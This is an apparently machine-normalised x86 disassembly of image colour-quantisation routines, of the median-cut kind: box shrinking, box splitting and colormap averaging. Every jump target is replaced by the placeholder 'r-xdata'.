mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4288e0
add esp 0x8
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_428de0
add esp 0x10
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x8 ]
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x70 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x60
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x18 ] ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0xc ]
shl ecx 0x5
mov edx [ ebp - 0x4 ]
add edx ecx
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4290a0
add esp 0xc
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_4288e0
push ebp
mov ebp esp
sub esp 0x80
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0xc ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x20 ]
cmp ecx [ ebp - 0x1c ]
jle r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x20 ]
jg r-xdata
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x24 ]
jle r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jl r-xdata
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x28 ]
jg r-xdata
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x28 ]
jg r-xdata
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x2c ]
jle r-xdata
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x24 ]
jl r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x28 ]
jg r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
shl edx 0x6
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + eax * 4 ]
add eax edx
mov ecx [ ebp - 0x2c ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov ecx [ ebp - 0x20 ]
sub ecx [ ebp - 0x1c ]
shl ecx 0x3
shl ecx 0x1
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x28 ]
sub edx [ ebp - 0x24 ]
shl edx 0x2
imul edx edx 0x3
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x2c ]
shl eax 0x3
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x34 ]
imul ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x38 ]
imul edx [ ebp - 0x38 ]
add ecx edx
mov eax [ ebp - 0x3c ]
imul eax [ ebp - 0x3c ]
add ecx eax
mov edx [ ebp + 0xc ]
mov [ edx + 0x18 ] ecx
mov [ ebp - 0x40 ] 0x0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x30 ]
jg r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x20 ]
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x14 ]
shl ecx 0x6
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + edx * 4 ]
add edx ecx
mov eax [ ebp - 0x2c ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x30 ]
jg r-xdata
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x20 ]
jg r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x2c ]
jl r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x20 ]
jg r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
shl eax 0x6
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx [ edx + ecx * 4 ]
add ecx eax
mov edx [ ebp - 0x2c ]
lea eax [ ecx + edx * 2 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x10 ]
sub edx 0x1
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x30 ]
jg r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cx [ eax ]
mov edx [ ebp - 0xc ]
add edx 0x2
mov [ ebp - 0xc ] edx
test ecx ecx
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ edx + 0x1c ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
shl edx 0x6
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + eax * 4 ]
add eax edx
mov ecx [ ebp - 0x2c ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x30 ]
jg r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
xor eax eax
mov ax [ edx ]
mov ecx [ ebp - 0xc ]
add ecx 0x2
mov [ ebp - 0xc ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x28 ]
jg r-xdata
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x20 ]
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x24 ]
shl ecx 0x6
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + edx * 4 ]
add edx ecx
mov eax [ ebp - 0x18 ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
sub eax 0x1
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x30 ]
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
xor edx edx
mov dx [ ecx ]
mov eax [ ebp - 0xc ]
add eax 0x2
mov [ ebp - 0xc ] eax
test edx edx
je r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov eax [ ebp - 0x14 ]
shl eax 0x6
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx [ edx + ecx * 4 ]
add ecx eax
mov edx [ ebp - 0x2c ]
lea eax [ ecx + edx * 2 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x24 ]
shl eax 0x6
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx [ edx + ecx * 4 ]
add ecx eax
mov edx [ ebp - 0x18 ]
lea eax [ ecx + edx * 2 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x28 ]
jg r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cx [ eax ]
mov edx [ ebp - 0xc ]
add edx 0x2
mov [ ebp - 0xc ] edx
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x24 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x30 ]
jg r-xdata
mov ecx [ ebp - 0x18 ]
sub ecx 0x1
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x28 ]
jg r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x28 ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ ebp - 0xc ]
xor eax eax
mov ax [ edx ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
xor eax eax
mov ax [ edx ]
test eax eax
je r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x10 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x40 ]
add ecx 0x1
mov [ ebp - 0x40 ] ecx
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x30 ]
mov [ edx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x40
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0xc ]
add eax 0x2
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
add eax 0x40
mov [ ebp - 0xc ] eax
sub_428de0
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x10 ]
shl ecx 0x1
cmp ecx [ ebp + 0x14 ]
jg r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_429030
add esp 0x8
mov [ ebp - 0x1c ] eax
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_428fc0
add esp 0x8
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
shl eax 0x5
mov ecx [ ebp + 0xc ]
add ecx eax
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
mov ecx [ eax + 0xc ]
mov [ edx + 0xc ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
mov ecx [ eax + 0x14 ]
mov [ edx + 0x14 ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
mov [ edx ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
mov ecx [ eax + 0x10 ]
mov [ edx + 0x10 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
mov ecx [ edx + 0x4 ]
sub ecx [ eax ]
shl ecx 0x3
shl ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
mov ecx [ edx + 0xc ]
sub ecx [ eax + 0x8 ]
shl ecx 0x2
imul ecx ecx 0x3
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
mov ecx [ edx + 0x14 ]
sub ecx [ eax + 0x10 ]
shl ecx 0x3
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x18 ]
jle r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x1c ]
mov eax [ ecx + 0x4 ]
mov edx [ ebp - 0x1c ]
add eax [ edx ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx 0x1
mov eax [ ebp - 0x20 ]
mov [ eax ] edx
jmp r-xdata
cmp [ ebp - 0x24 ] 0x1
je r-xdata
mov ecx [ ebp - 0x1c ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4288e0
add esp 0x8
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4288e0
add esp 0x8
mov edx [ ebp + 0x10 ]
add edx 0x1
mov [ ebp + 0x10 ] edx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov eax [ ecx + 0xc ]
mov edx [ ebp - 0x1c ]
add eax [ edx + 0x8 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov edx [ ebp - 0x8 ]
add edx 0x1
mov eax [ ebp - 0x20 ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebp - 0x24 ] 0x2
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
mov ecx [ ebp - 0x1c ]
mov eax [ ecx + 0x14 ]
mov edx [ ebp - 0x1c ]
add eax [ edx + 0x10 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x14 ] ecx
mov edx [ ebp - 0x8 ]
add edx 0x1
mov eax [ ebp - 0x20 ]
mov [ eax + 0x10 ] edx
jmp r-xdata
sub_428fc0
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0xc ]
jge r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1c ]
cmp edx [ ebp - 0xc ]
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x20
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0xc ] eax
sub_429030
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0xc ]
jge r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x18 ]
cmp edx [ ebp - 0xc ]
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x18 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x20
mov [ ebp - 0x4 ] edx
sub_4290a0
push ebp
mov ebp esp
sub esp 0x84
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x44 ] 0x0
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0xc ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov ecx [ ebp - 0x38 ]
sar ecx 0x1
mov eax [ ebp - 0x3c ]
add eax ecx
cdq
idiv [ ebp - 0x38 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x74 ]
mov edx [ ecx ]
mov ecx [ ebp + 0x10 ]
mov [ edx + ecx ] al
mov edx [ ebp - 0x38 ]
sar edx 0x1
mov eax [ ebp - 0x40 ]
add eax edx
cdq
idiv [ ebp - 0x38 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x74 ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp + 0x10 ]
mov [ ecx + edx ] al
mov eax [ ebp - 0x38 ]
sar eax 0x1
mov ecx [ ebp - 0x44 ]
add eax ecx
cdq
idiv [ ebp - 0x38 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x74 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov [ edx + ecx ] al
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x28 ]
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x14 ]
shl ecx 0x6
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + edx * 4 ]
add edx ecx
mov eax [ ebp - 0x2c ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x30 ]
jg r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
xor eax eax
mov ax [ edx ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
add edx 0x2
mov [ ebp - 0xc ] edx
test ecx ecx
je r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x38 ]
add eax [ ebp - 0x34 ]
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x10 ]
lea edx [ ecx * 8 + 0x4 ]
imul edx [ ebp - 0x34 ]
mov eax [ ebp - 0x3c ]
add eax edx
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x14 ]
lea edx [ ecx * 4 + 0x2 ]
imul edx [ ebp - 0x34 ]
mov eax [ ebp - 0x40 ]
add eax edx
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x18 ]
lea edx [ ecx * 8 + 0x4 ]
imul edx [ ebp - 0x34 ]
mov eax [ ebp - 0x44 ]
add eax edx
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
sub_429250
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429280
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0x58
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x1a8 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_429950
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] sub_4318b0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] sub_42a370
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x34 ] 0x0
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x64 ] 0x4
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x54 ] 0x100
jle r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x37
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x18 ] 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
call sub_429380
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_429700
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4c ] 0x2
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x39
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x18 ] 0x100
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4298e0
add esp 0x4
sub_429380
push ebp
mov ebp esp
sub esp 0x70
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x20
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_429550
add esp 0x8
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x64 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x5f
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x18 ] ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
add eax 0x18
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0xc ]
mov [ ecx ] edx
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x20 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x28 ]
mov [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x5e
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
xor edx edx
test edx edx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
cmp edx [ ecx + 0x64 ]
jge r-xdata
